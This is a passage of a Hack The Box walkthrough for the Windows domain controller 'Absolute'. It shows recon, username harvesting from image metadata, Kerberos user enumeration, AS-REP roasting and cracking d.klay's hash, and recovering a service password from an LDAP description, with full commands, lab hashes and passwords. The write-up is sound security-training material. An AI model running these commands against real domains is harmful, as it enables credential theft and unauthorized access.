# HTB: Absolute
Source: https://0xdf.gitlab.io/2023/05/27/htb-absolute.html
Date: 2023-05-27

# HTB: Absolute

htb-absolute hackthebox ctf windows iis crackmapexec ldapsearch dnsenum feroxbuster exiftool username-anarchy kerbrute as-rep-roast hashcat kerberos kinit klist bloodhound bloodhound-python rpc dynamic-reversing wireshark shadow-credential certipy krbrelay visual-studio runascs krbrelayup rubeus dcsync htb-outdated osep-plus oscp-plus-v3 osep-like May 27, 2023

HTB: Absolute

HTB: Absolute

![Absolute](/img/absolute-cover.png)
Absolute is a much easier box to solve today than it was when it first released in September 2022. At that time, many of the tools necessary to solve the box didn’t support Kerberos authentication, forcing the place to figure out ways to make things work. Still, even today, it’s a maze of Windows enumeration and exploitation that starts with some full names in the metadata of images. I’ll figure out the username format for the domain, and AS-REP-Roast to get creds. LDAP enumeration leads to the next set of creds. Access to a share provides a Nim binary, where some dynamic analysis provides yet another set of creds. This user is able to modify a group and from there modify a user to add a shadow credential and finally get a shell on the box. To get administrator access, I’ll abuse relaying Kerberos, showing both KrbRelay to add a user to the administrators group, and KrbRelayUp to get the machine account hash and do a DC sync attack.

## Box Info

![Absolute](/icons/box-absolute.png)
![Windows](/icons/Windows.png)
![Rated difficulty for Absolute](/img/absolute-diff.png)
![Radar chart for Absolute](/img/absolute-radar.png)
![snowscan](https://www.hackthebox.com/badge/image/9267)
![jazzpizazz](https://www.hackthebox.com/badge/image/87804)
![Geiseric](https://www.hackthebox.com/badge/image/184611)

## Recon

### nmap

nmap finds a bunch of open TCP ports, typical of a Windows domain controller:

```
nmap
```

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.181
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 06:36 EDT
Nmap scan report for 10.10.11.181
Host is up (0.087s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
49692/tcp open  unknown
49699/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
oxdf@hacky$ nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.11.181
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 06:37 EDT
Nmap scan report for 10.10.11.181
Host is up (0.088s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-21 17:38:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-21T17:40:40+00:00; +6h59m59s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-21T17:40:39+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-21T17:40:40+00:00; +6h59m59s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-21T17:40:39+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/21%Time=6469F493%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-21T17:40:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.96 seconds
```

The IIS version suggests Absolute is running Windows 10 / Server 2016 or later. The LDAP scan shows the hostname of dc.absolute.htb . I’ll add it and the base domain to my /etc/hosts file:

```
dc.absolute.htb
```

```
/etc/hosts
```

```
10.10.11.181 absolute.htb dc.absolute.htb
```

There’s a seven hour clock skew, which I’ll want to keep in mind if I am doing any Kerberos auth.

I’ll note that WinRM (5985) is open for when I find creds.

### SMB - TCP 445

I’m not able to get a connection to SMB without creds:

```
oxdf@hacky$ crackmapexec smb 10.10.11.181 --shares
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
oxdf@hacky$ crackmapexec smb 10.10.11.181 --shares -u 0xdf -p ''
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\0xdf: STATUS_LOGON_FAILURE
```

### LDAP - TCP 389+

ldapsearch will give the base naming context, which matches absolute.htb :

```
ldapsearch
```

```
absolute.htb
```

```
oxdf@hacky$ ldapsearch -H ldap://dc.absolute.htb -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=absolute,DC=htb
namingcontexts: CN=Configuration,DC=absolute,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=absolute,DC=htb
namingcontexts: DC=DomainDnsZones,DC=absolute,DC=htb
namingcontexts: DC=ForestDnsZones,DC=absolute,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Trying to get any additional information requires auth:

```
oxdf@hacky$ ldapsearch -H ldap://dc.absolute.htb -x -b "DC=absolute,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=absolute,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

### DNS - TCP/UDP 53

I can try a zone transfer, but it fails:

```
oxdf@hacky$ dig +noall +answer @10.10.11.181 axfr absolute.htb
; Transfer failed.
```

I can confirm the two names I already know:

```
oxdf@hacky$ dig +noall +answer @10.10.11.181 absolute.htb
absolute.htb.           600     IN      A       10.10.11.181
oxdf@hacky$ dig +noall +answer @10.10.11.181 dc.absolute.htb
dc.absolute.htb.        3600    IN      A       10.10.11.181
```

I’ll brute force subdomains with dnsenum . It confirms what I identified manually above, and finds a few other subdomains via bruteforce:

```
dnsenum
```

```
oxdf@hacky$ dnsenum --dnsserver 10.10.11.181 -f /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt absolute.htb
dnsenum VERSION:1.2.6

-----   absolute.htb   -----

Host's addresses:
__________________

absolute.htb.                            600      IN    A        10.10.11.181

Name Servers:
______________

dc.absolute.htb.                         1200     IN    A        10.10.11.181

Mail (MX) Servers:
___________________

Trying Zone Transfers and getting Bind Versions:
_________________________________________________

Trying Zone Transfer for absolute.htb on dc.absolute.htb ... 
AXFR record query failed: REFUSED

Brute forcing with /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:
________________________________________________________________________________

dc.absolute.htb.                         1200     IN    A        10.10.11.181
gc._msdcs.absolute.htb.                  600      IN    A        10.10.11.181
domaindnszones.absolute.htb.             600      IN    A        10.10.11.181
forestdnszones.absolute.htb.             600      IN    A        10.10.11.181

absolute.htb class C netranges:
________________________________

Performing reverse lookup on 0 ip addresses:
_____________________________________________

0 results out of 0 IP addresses.

absolute.htb ip blocks:
________________________

done.
```

None of these are particularly interesting.

### Website - TCP 80

#### Site

The website is a simple page focused on design and images:

![image-20230521125137159](/img/image-20230521125137159.png)
The image rotates every few seconds. The only link leads to the template.

#### Tech Stack

The HTTP response headers just say IIS without much else:

```
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 07 Jun 2022 19:29:10 GMT
Accept-Ranges: bytes
ETag: "0877fdca47ad81:0"
Server: Microsoft-IIS/10.0
Date: Sun, 21 May 2023 23:50:51 GMT
Connection: close
Content-Length: 2909
```

The front page itself loads as index.html , suggesting perhaps it’s just a static site.

```
index.html
```

The 404 page looks a lot like the IIS default 404.

The rotating pictures seem to be in a hero-slider and owl-carousel div:

```
hero-slider
```

```
owl-carousel
```

![image-20230521125805708](/img/image-20230521125805708.png)

#### Directory Brute Force

I’ll run feroxbuster against the site:

```
feroxbuster
```

```
oxdf@hacky$ feroxbuster -u http://absolute.htb 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://absolute.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      150c http://absolute.htb/images => http://absolute.htb/images/
301      GET        2l       10w      147c http://absolute.htb/css => http://absolute.htb/css/
301      GET        2l       10w      146c http://absolute.htb/js => http://absolute.htb/js/
200      GET        6l       77w     3351c http://absolute.htb/css/owl.carousel.min.css
301      GET        2l       10w      150c http://absolute.htb/Images => http://absolute.htb/Images/
200      GET     3625l     7946w    77906c http://absolute.htb/css/animate.css
301      GET        2l       10w      149c http://absolute.htb/fonts => http://absolute.htb/fonts/
301      GET        2l       10w      147c http://absolute.htb/CSS => http://absolute.htb/CSS/
200      GET     7808l    48362w  3771054c http://absolute.htb/images/hero_4.jpg
301      GET        2l       10w      146c http://absolute.htb/JS => http://absolute.htb/JS/
301      GET        2l       10w      146c http://absolute.htb/Js => http://absolute.htb/Js/
301      GET        2l       10w      147c http://absolute.htb/Css => http://absolute.htb/Css/
200      GET     6692l    42749w  3290518c http://absolute.htb/images/hero_5.jpg
200      GET        7l      277w    44342c http://absolute.htb/js/owl.carousel.min.js
301      GET        2l       10w      150c http://absolute.htb/IMAGES => http://absolute.htb/IMAGES/
403      GET       29l       92w     1233c http://absolute.htb/fonts/icomoon/
200      GET    22590l   126364w  9918283c http://absolute.htb/images/hero_6.jpg
301      GET        2l       10w      163c http://absolute.htb/fonts/icomoon/fonts => http://absolute.htb/fonts/icomoon/fonts/
200      GET     1306l     7961w   733740c http://absolute.htb/images/hero_1.jpg
200      GET      948l     7256w   690337c http://absolute.htb/images/hero_3.jpg
200      GET      145l      442w     4030c http://absolute.htb/css/style.css
301      GET        2l       10w      149c http://absolute.htb/Fonts => http://absolute.htb/Fonts/
200      GET        7l      689w    63240c http://absolute.htb/js/bootstrap.min.js
200      GET        2l     1283w    86926c http://absolute.htb/js/jquery-3.3.1.min.js
200      GET     4919l     8218w    79820c http://absolute.htb/fonts/icomoon/style.css
200      GET        7l     2103w   160392c http://absolute.htb/css/bootstrap.min.css
...[snip]...
```

It finds a handful of stuff, but nothing interesting.

## Auth as d.klay

### Get Username List

#### Image Metadata

I’ll download the six “hero” images from the carousel with a simple Bash loop, for i in $(seq 1 6); do wget http://absolute.htb/images/hero_${i}.jpg; done . I’ll look a the metadata on the image with exiftool :

```
for i in $(seq 1 6); do wget http://absolute.htb/images/hero_${i}.jpg; done
```

```
exiftool
```

```
oxdf@hacky$ exiftool hero_1.jpg 
ExifTool Version Number         : 12.40
File Name                       : hero_1.jpg
Directory                       : .
File Size                       : 398 KiB
File Modification Date/Time     : 2022:06:07 15:45:20-04:00
File Access Date/Time           : 2023:05:21 13:10:06-04:00
File Inode Change Date/Time     : 2023:05:21 13:10:05-04:00
File Permissions                : -rwxrwx---
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1900x1150
Megapixels                      : 2.2
```

James Roberts is the “Author” and “Artist”. The others dont have an “Artist”, but they all have an “Author” field.

#### Generate Users List

With a list of users, I can test Kerberos to see if any are valid usernames. I’ll get a list of user names:

```
oxdf@hacky$ for i in $(seq 1 6); do exiftool hero_${i}.jpg | grep Author | awk '{print $3 " " $4}'; done | tee users
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
```

I could take each of these and generate a list of possible common usernames by hand, but it’s easier to use username-anarchy to generate a list of usernames:

```
oxdf@hacky$ /opt/username-anarchy/username-anarchy -i users | tee usernames
james       
jamesroberts
james.roberts
jamesrob
jamerobe
jamesr 
j.roberts
jroberts
rjames 
r.james
robertsj
roberts     
roberts.j
roberts.james
jr
...[snip]...
```

#### Find Valid Usernames

kerbrute is a tool for brute-forcing Kerberos. One of the options, userenum will check which names in a list are valid usernames:

```
userenum
```

```
oxdf@hacky$ kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/21/23 - Ronnie Flathers @ropnop

2023/05/21 13:57:41 >  Using KDC(s):
2023/05/21 13:57:41 >   dc.absolute.htb:88

2023/05/21 13:57:41 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2023/05/21 13:57:41 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2023/05/21 13:57:41 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2023/05/21 13:57:41 >  [+] VALID USERNAME:       d.klay@absolute.htb
2023/05/21 13:57:41 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2023/05/21 13:57:41 >  [+] VALID USERNAME:       n.smith@absolute.htb
2023/05/21 13:57:41 >  Done! Tested 88 usernames (6 valid) in 0.794 seconds
```

It’s clear that this domain is using [first initial].[lastname] as the username syntax.

Alternatively, crackmapexec can also handle this check (shown with a smaller username list to demonstrate the difference):

```
crackmapexec
```

Click for full size image

![image-20230522132556877](/img/image-20230522132556877.png)
The purple [-] fails with STATUS_ACCOUNT_RESTRICTION rather than the others which return STATUS_LOGON_FAILURE , suggesting those accounts exist.

```
[-]
```

```
STATUS_ACCOUNT_RESTRICTION
```

```
STATUS_LOGON_FAILURE
```

### AS-Rep-Roast

#### Capture Hash

Without passwords, I still can’t connect to the domain to try Bloodhound or Kerberoasting. I can check for AS-Rep-Roast-able users:

```
oxdf@hacky$ GetNPUsers.py -dc-ip dc.absolute.htb -usersfile valid_users absolute.htb/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@ABSOLUTE.HTB:ad46f063b562f401556b5776be338a99$42087e6c57351f790f2847e472feb8b0a4d2e9d340ed28c8841483140e4eb039c9a29459d0bb15c470202904148c9ba298e36836317ca13753ad62e28a8b400687fa64c5da09d4da3191e2aa7346fb9472d088cf9ba89993aaead6b8fd514e3a64b317f50a8844137c74d5daa51dfcfa0ad5f74c81e71228085565aa4597c3ae1385f5626d90b1215730b037b78cac4d105d9b3ca4c50279ad946e47ef8969d17d6d81aaf52b9d4248d771d6f33b893716468858ee8000e967062c658f692204d45518ef80bdd9094dcc44513a46a1c456dcebb32b072955ab8eb6db1b0482adae2ecd7847f420c3d4f35020
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

d.klay is vulnerable.

#### Crack Password

I’ll give this hash to hashcat and have it try rockyou.txt against it:

```
hashcat
```

```
rockyou.txt
```

```
$ hashcat d.klay.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
...[snip]...
$krb5asrep$23$d.klay@ABSOLUTE.HTB:ad46f063b562f401556b5776be338a99$42087e6c57351f790f2847e472feb8b0a4d2e9d340ed28c8841483140e4eb039c9a29459d0bb15c470202904148c9ba298e36836317ca13753ad62e28a8b400687fa64c5da09d4da3191e2aa7346fb9472d088cf9ba89993aaead6b8fd514e3a64b317f50a8844137c74d5daa51dfcfa0ad5f74c81e71228085565aa4597c3ae1385f5626d90b1215730b037b78cac4d105d9b3ca4c50279ad946e47ef8969d17d6d81aaf52b9d4248d771d6f33b893716468858ee8000e967062c658f692204d45518ef80bdd9094dcc44513a46a1c456dcebb32b072955ab8eb6db1b0482adae2ecd7847f420c3d4f35020:Darkmoonsky248girl
...[snip]...
```

The password is Darkmoonsky248girl .

```
Darkmoonsky248girl
```

### Kerberos Auth

#### Validate with CME

Trying to validate that with crackmapexec fails:

```
crackmapexec
```

```
oxdf@hacky$ crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl'
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
```

STATUS_ACCOUNT_RESTRICTION typically means NTLM is disabled, and I’ll need to use Kerberos for auth. That works:

```
STATUS_ACCOUNT_RESTRICTION
```

```
oxdf@hacky$ crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
```

#### kinit

Some tools like crackmapexec can just speak Kerberos on their own. For others, I’ll need t get a ticket. I can generate one with kinit :

```
crackmapexec
```

```
kinit
```

```
oxdf@hacky$ kinit d.klay
Password for d.klay@ABSOLUTE.HTB: 
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: d.klay@ABSOLUTE.HTB

Valid starting       Expires              Service principal
05/22/2023 20:31:25  05/23/2023 00:31:25  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
        renew until 05/23/2023 00:31:25
```

klist shows that this has created a ticket in /tmp/krb5cc_1000 and other ticket details.

```
klist
```

```
/tmp/krb5cc_1000
```

If the clock skew between my time and the DC’s is too large, this will fail. In VirtualBox, I’ll need to stop the guest tools from syncing the clock with sudo service vboxadd-service stop . Then I’ll run sudo ntpdate 10.10.11.181 .

```
sudo service vboxadd-service stop
```

```
sudo ntpdate 10.10.11.181
```

## Auth as svc_smb

### Bloodhound

With creds, I’ll collect Bloodhound data with Bloodhound-Python :

```
oxdf@hacky$ bloodhound-python -u d.klay -p 'Darkmoonsky248girl' -k -d absolute.htb -dc dc.absolute.htb -c ALL --zip
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 00M 16S
INFO: Compressing output into 20230522221951_bloodhound.zip
```

I’ll upload the data into Bloodhound, and find d.klay, marking them as owned:

![image-20230522153157773](/img/image-20230522153157773.png)
Unfortunately, this user has no local admin rights, no execution rights, and no outbound object control rights of interest:

![image-20230522153310358](/img/image-20230522153310358.png)

### SMB

With creds, I can look at SMB shares:

```
oxdf@hacky$ crackmapexec smb dc.absolute.htb -k -u d.klay -p 'Darkmoonsky248girl' --shares
SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         dc.absolute.htb 445    DC               [+] Enumerated shares
SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark
SMB         dc.absolute.htb 445    DC               -----           -----------     ------
SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin
SMB         dc.absolute.htb 445    DC               C$                              Default share
SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC
SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share 
SMB         dc.absolute.htb 445    DC               Shared                          
SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share
```

I’ll connect using Impacket ’s smbclient.py :

```
smbclient.py
```

```
oxdf@hacky$ smbclient.py 'absolute.htb/d.klay:Darkmoonsky248girl@dc.absolute.htb' -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
Type help for list of commands
#
```

I can list the shares, and connect to a share, like SYSVOL :

```
SYSVOL
```

```
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
# use sysvol
# ls
drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 .
drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 ..
drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 absolute.htb
```

There’s nothing interesting here.

### CrackMapExec

With creds now, I can connect to LDAP. One thing to pull would be the list of users. crackmapexec will do this:

```
crackmapexec
```

```
oxdf@hacky$ crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.181    389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
LDAP        10.10.11.181    389    DC               [*] Total of records returned 20
LDAP        10.10.11.181    389    DC               Administrator                  Built-in account for administering the computer/domain
LDAP        10.10.11.181    389    DC               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.10.11.181    389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.10.11.181    389    DC               J.Roberts                      
LDAP        10.10.11.181    389    DC               M.Chaffrey                     
LDAP        10.10.11.181    389    DC               D.Klay                         
LDAP        10.10.11.181    389    DC               s.osvald                       
LDAP        10.10.11.181    389    DC               j.robinson                     
LDAP        10.10.11.181    389    DC               n.smith                        
LDAP        10.10.11.181    389    DC               m.lovegod                      
LDAP        10.10.11.181    389    DC               l.moore                        
LDAP        10.10.11.181    389    DC               c.colt                         
LDAP        10.10.11.181    389    DC               s.johnson                      
LDAP        10.10.11.181    389    DC               d.lemm                         
LDAP        10.10.11.181    389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.10.11.181    389    DC               svc_audit                      
LDAP        10.10.11.181    389    DC               winrm_user                     Used to perform simple network tasks
```

Not only does it give the users, but also the description field if it’s populated (may need to scroll over to see it above). The svc_smb user description of “AbsoluteSMBService123!” looks like a password.

crackmapexec confirms this:

```
crackmapexec
```

```
oxdf@hacky$ crackmapexec smb 10.10.11.181 -u svc_smb -p 'AbsoluteSMBService123!' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
```

### Without CME

#### ldapsearch Errors

If I need to get into LDAP with more detail, I’d use ldapsearch . There are a couple errors that are likely to come up. If I try to run with creds, it will return AcceptSecurityContext :

```
ldapsearch
```

```
AcceptSecurityContext
```

```
oxdf@hacky$ ldapsearch -H ldap://dc.absolute.htb -x -D d.klay@absolute.htb -w Darkmoonsky248girl -s base
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52f, v4563
```

This is because the account is restricted (no NTLM, only Kerberos).

I’ll use -Y GSSAPI to specify Kerberos auth. It’s also good to install the libsasl2-modules-gssapi-mit package with apt to prevent another error.

```
-Y GSSAPI
```

```
libsasl2-modules-gssapi-mit
```

```
apt
```

With kinit having a ticket, I was still getting this error:

```
kinit
```

```
oxdf@hacky$ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "dc=absolute,dc=htb"                  
SASL/GSSAPI authentication started                                                                                                      
ldap_sasl_interactive_bind: Local error (-2)                                                                                            
        additional info: SASL(-1): generic failure: GSSAPI Error: Unspecified GSS failure.  Minor code may provide more information (Server not found in Kerberos database)
```

To fix this, I’ll make sure that dc.absolute.htb comes before absolute.htb in my /etc/hosts file. That’s because Kerberos is doing a reverse lookup on the IP to get the server name. My OS checks the hosts file, and gets the first host with that IP. Then when it tries to look up that host (absolute.htb) in the Kerberos DB, it doesn’t find one, and returns Server not found in Kerberos database . Props to Ippsec for figuring this out - he shows this in Wireshark in his video .

```
dc.absolute.htb
```

```
absolute.htb
```

```
/etc/hosts
```

```
Server not found in Kerberos database
```

#### Get Data

With these issues resolved, I’m able to query LDAP:

```
oxdf@hacky$ ldapsearch -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb" | less
...[snip]...
# svc_smb, Users, absolute.htb
dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_smb
description: AbsoluteSMBService123!
distinguishedName: CN=svc_smb,CN=Users,DC=absolute,DC=htb
instanceType: 4
whenCreated: 20220609082551.0Z
whenChanged: 20230523003558.0Z
...[snip]...
```

The password can be found in the information for the svc_smb user.

## Auth as m.lovegod

### Enumeration

